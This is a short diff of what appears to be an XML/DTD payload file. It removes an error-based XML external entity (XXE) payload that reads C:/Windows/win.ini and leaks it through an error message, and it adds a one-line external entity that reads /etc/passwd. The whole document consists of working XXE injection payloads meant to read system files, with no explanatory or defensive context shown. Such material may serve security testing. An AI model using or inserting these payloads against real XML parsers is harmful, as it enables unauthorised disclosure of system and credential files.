@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
